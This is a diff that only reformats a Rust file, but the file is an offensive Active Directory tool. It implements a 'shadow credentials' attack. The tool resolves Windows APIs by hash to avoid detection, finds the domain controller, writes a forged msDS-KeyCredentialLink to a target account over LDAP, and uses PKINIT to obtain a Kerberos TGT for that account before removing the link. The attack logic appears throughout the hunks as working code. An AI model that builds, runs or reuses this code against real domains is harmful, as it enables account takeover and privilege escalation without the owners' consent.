@@ -38,14 +38,14 @@ use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
 use base64::engine::Engine;
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
+use tracing::{debug, info, warn};
 
-use crate::win_types::GUID;
 use crate::win_types::DWORD;
-use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
+use crate::win_types::GUID;
 use crate::win_types::S_OK;
+use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
 
 // ── Compile-time API hash constants ─────────────────────────────────────────
 
@@ -53,8 +53,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // wldap32.dll — LDAP client functions
 const WLDAP32_DLL_W: &[u16] = &[
-    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);
 
@@ -73,8 +73,8 @@ const FN_LDAP_ERR2STRING: u32 = hash_str_const(b"ldap_err2stringW");
 
 // netapi32.dll — DsGetDcNameW for DC discovery
 const NETAPI32_DLL_W: &[u16] = &[
-    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);
 
@@ -84,8 +84,8 @@ const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");
 // kernel32.dll — for string conversion (reserved for future use)
 #[allow(dead_code)]
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 #[allow(dead_code)]
 const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);
@@ -351,11 +351,11 @@ fn discover_dc() -> Result<String> {
         .ok_or_else(|| anyhow!("netapi32.dll not found"))?;
 
     let ds_get_dc_name_w: unsafe fn(
-        LPCWSTR,      // ComputerName
-        LPCWSTR,      // DomainName
-        *mut GUID,    // DomainGuid
-        LPCWSTR,      // SiteName
-        DWORD,        // Flags
+        LPCWSTR,   // ComputerName
+        LPCWSTR,   // DomainName
+        *mut GUID, // DomainGuid
+        LPCWSTR,   // SiteName
+        DWORD,     // Flags
         *mut *mut DOMAIN_CONTROLLER_INFO_W,
     ) -> HRESULT = unsafe {
         mem::transmute(
@@ -373,7 +373,14 @@ fn discover_dc() -> Result<String> {
 
     let mut dc_info: *mut DOMAIN_CONTROLLER_INFO_W = ptr::null_mut();
     let hr = unsafe {
-        ds_get_dc_name_w(ptr::null(), ptr::null(), ptr::null_mut(), ptr::null(), 0, &mut dc_info)
+        ds_get_dc_name_w(
+            ptr::null(),
+            ptr::null(),
+            ptr::null_mut(),
+            ptr::null(),
+            0,
+            &mut dc_info,
+        )
     };
 
     if hr != S_OK as HRESULT || dc_info.is_null() {
@@ -386,9 +393,10 @@ fn discover_dc() -> Result<String> {
             net_api_buffer_free(dc_info as *mut c_void);
             bail!("DC name is null");
         }
-        let name = wide_to_str(
-            &std::slice::from_raw_parts(name_ptr, lstrlen_w(name_ptr) as usize + 1),
-        )?;
+        let name = wide_to_str(&std::slice::from_raw_parts(
+            name_ptr,
+            lstrlen_w(name_ptr) as usize + 1,
+        ))?;
         name
     };
 
@@ -448,7 +456,8 @@ impl LdapConnection {
         }
 
         // Bind using current security context (SSPI Negotiate)
-        let res = unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
+        let res =
+            unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
         if res != 0 {
             bail!("ldap_bind_sW failed: error {}", res);
         }
@@ -549,9 +558,10 @@ impl LdapConnection {
 
         let dn = unsafe {
             let val_ptr = *values;
-            let s = wide_to_str(
-                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-            )?;
+            let s = wide_to_str(&std::slice::from_raw_parts(
+                val_ptr,
+                lstrlen_w(val_ptr) as usize + 1,
+            ))?;
             ldap_value_free_w(values);
             ldap_msgfree(result);
             s
@@ -658,9 +668,10 @@ impl LdapConnection {
         } else {
             unsafe {
                 let val_ptr = *values;
-                let s = wide_to_str(
-                    &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-                )?;
+                let s = wide_to_str(&std::slice::from_raw_parts(
+                    val_ptr,
+                    lstrlen_w(val_ptr) as usize + 1,
+                ))?;
                 ldap_value_free_w(values);
                 s
             }
@@ -771,9 +782,10 @@ impl LdapConnection {
 
         let nc = unsafe {
             let val_ptr = *values;
-            let s = wide_to_str(
-                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-            )?;
+            let s = wide_to_str(&std::slice::from_raw_parts(
+                val_ptr,
+                lstrlen_w(val_ptr) as usize + 1,
+            ))?;
             ldap_value_free_w(values);
             ldap_msgfree(result);
             s
@@ -866,8 +878,7 @@ impl Drop for LdapConnection {
             if let Some(base) = wldap32 {
                 let ldap_unbind: unsafe fn(PLDAP) -> DWORD = unsafe {
                     mem::transmute(
-                        pe_resolve::get_proc_address_by_hash(base, FN_LDAP_UNBIND)
-                            .unwrap_or(0),
+                        pe_resolve::get_proc_address_by_hash(base, FN_LDAP_UNBIND).unwrap_or(0),
                     )
                 };
                 if ldap_unbind as usize != 0 {
@@ -891,7 +902,7 @@ impl Drop for LdapConnection {
 ///
 /// Returns (private_key_der, certificate_der).
 pub fn generate_self_signed_cert(subject: &str) -> Result<(Vec<u8>, Vec<u8>)> {
-    use rcgen::{CertificateParams, DnType, ExtendedKeyUsagePurpose, KeyPair, IsCa};
+    use rcgen::{CertificateParams, DnType, ExtendedKeyUsagePurpose, IsCa, KeyPair};
 
     let mut params = CertificateParams::new(vec![])
         .map_err(|e| anyhow!("Failed to create cert params: {}", e))?;
@@ -1046,10 +1057,7 @@ fn parse_or_generate_guid(guid_str: &str) -> Result<[u8; 16]> {
     let cleaned: String = guid_str.chars().filter(|c| *c != '-').collect();
     if cleaned.len() == 32 {
         let bytes: Vec<u8> = (0..16)
-            .map(|i| {
-                u8::from_str_radix(&cleaned[i * 2..i * 2 + 2], 16)
-                    .unwrap_or(0)
-            })
+            .map(|i| u8::from_str_radix(&cleaned[i * 2..i * 2 + 2], 16).unwrap_or(0))
             .collect();
 
         // GUIDs in AD are stored in mixed-endian format:
@@ -1142,11 +1150,7 @@ pub fn authenticate_via_pkinit(
 ///   }
 /// }
 /// ```
-fn build_pkinit_as_req(
-    target_upn: &str,
-    _private_key: &[u8],
-    cert_der: &[u8],
-) -> Result<Vec<u8>> {
+fn build_pkinit_as_req(target_upn: &str, _private_key: &[u8], cert_der: &[u8]) -> Result<Vec<u8>> {
     // Split UPN into components
     let parts: Vec<&str> = target_upn.split('@').collect();
     let (username, realm) = if parts.len() == 2 {
@@ -1180,19 +1184,15 @@ fn build_pkinit_as_req(
 
     // cname inner: name-type + name-string
     let cname_inner = [
-        der_integer(1),                                   // NT-PRINCIPAL
-        der_sequence(&der_general_string(username)),      // name-string
+        der_integer(1),                              // NT-PRINCIPAL
+        der_sequence(&der_general_string(username)), // name-string
     ]
     .concat();
 
     // sname inner: name-type + name-string
-    let sname_names = [
-        der_general_string("krbtgt"),
-        der_general_string(realm),
-    ]
-    .concat();
+    let sname_names = [der_general_string("krbtgt"), der_general_string(realm)].concat();
     let sname_inner = [
-        der_integer(2),                      // NT-SRV_INST
+        der_integer(2), // NT-SRV_INST
         der_sequence(&sname_names),
     ]
     .concat();
@@ -1352,9 +1352,8 @@ fn send_kdc_request(dc_hostname: &str, port: u16, request: &[u8]) -> Result<Vec<
     let addr = format!("{}:{}", dc_hostname, port);
     debug!("Connecting to KDC at {}", addr);
 
-    let mut stream =
-        TcpStream::connect_timeout(&addr.parse()?, std::time::Duration::from_secs(10))
-            .with_context(|| format!("Failed to connect to KDC at {}", addr))?;
+    let mut stream = TcpStream::connect_timeout(&addr.parse()?, std::time::Duration::from_secs(10))
+        .with_context(|| format!("Failed to connect to KDC at {}", addr))?;
 
     // KDC TCP framing: 4-byte big-endian length prefix
     let len = request.len() as u32;
@@ -1597,16 +1596,17 @@ pub fn shadow_credentials_attack(target: &str) -> Result<ShadowCredentialsResult
     ldap.add_key_credential_link(&target_dn, &credential_link)?;
 
     // Step 10: Authenticate via PKINIT
-    let auth_result = match authenticate_via_pkinit(&target_upn, &private_key, &cert_der, &dc_hostname) {
-        Ok(result) => {
-            info!("PKINIT authentication successful for {}", target_upn);
-            Some(base64::engine::general_purpose::STANDARD.encode(&result.tgt_bytes))
-        }
-        Err(e) => {
-            warn!("PKINIT authentication failed: {:#}", e);
-            None
-        }
-    };
+    let auth_result =
+        match authenticate_via_pkinit(&target_upn, &private_key, &cert_der, &dc_hostname) {
+            Ok(result) => {
+                info!("PKINIT authentication successful for {}", target_upn);
+                Some(base64::engine::general_purpose::STANDARD.encode(&result.tgt_bytes))
+            }
+            Err(e) => {
+                warn!("PKINIT authentication failed: {:#}", e);
+                None
+            }
+        };
 
     // Step 11: Clean up — remove the credential link
     let cleaned_up = match ldap.remove_key_credential_link(&target_dn, &credential_link) {
@@ -1784,7 +1784,7 @@ mod tests {
         // Check version
         assert_eq!(link[0], 0x01); // version low byte
         assert_eq!(link[1], 0x00); // version high byte
-        // Check reserved
+                                   // Check reserved
         assert_eq!(link[2], 0x00);
         assert_eq!(link[3], 0x00);
         // KeyIdentifier (20 bytes) starts at offset 4
